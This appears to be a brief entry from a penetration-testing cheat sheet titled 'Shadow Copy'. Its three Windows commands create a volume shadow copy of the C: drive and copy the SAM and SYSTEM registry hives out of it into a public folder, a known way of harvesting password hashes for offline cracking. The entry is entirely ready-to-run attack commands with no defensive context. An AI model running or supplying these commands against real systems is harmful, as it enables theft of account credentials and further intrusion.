# Shadow Copy

```
wmic shadowcopy call create Volume='C:\'
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\public\sam.save
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\public\system.save
```
